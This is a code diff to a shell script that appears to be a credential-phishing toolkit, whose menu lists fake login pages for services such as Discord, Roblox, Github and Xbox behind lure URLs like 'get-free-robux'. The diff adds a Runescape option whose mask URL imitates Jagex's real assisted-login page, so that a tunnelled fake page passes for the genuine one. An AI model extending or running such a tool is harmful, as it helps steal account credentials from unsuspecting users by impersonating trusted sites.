@@ -750,7 +750,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox       ${RED}[${WHITE}36${RED}]${ORANGE} Runescape
 
 		${RED}[${WHITE}99${RED}]${ORANGE} Acerca de         ${RED}[${WHITE}00${RED}]${ORANGE} Salie
 
@@ -888,9 +888,13 @@ main_menu() {
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
 		35)
-			website="roblox"
-			mask='https://get-free-robux'
-			tunnel_menu;;
+    	website="roblox"
+    	mask='https://get-free-robux'
+    	tunnel_menu;;
+    36)
+    	website="runescape"
+    	mask='https://account.jagex.com/en-GB/assisted-login?login_challenge=f2d05a51f369457d8cbba452caa6d843#_ga=2.121694350.4462177.1722970880-1618189774.1716832339'
+    	tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
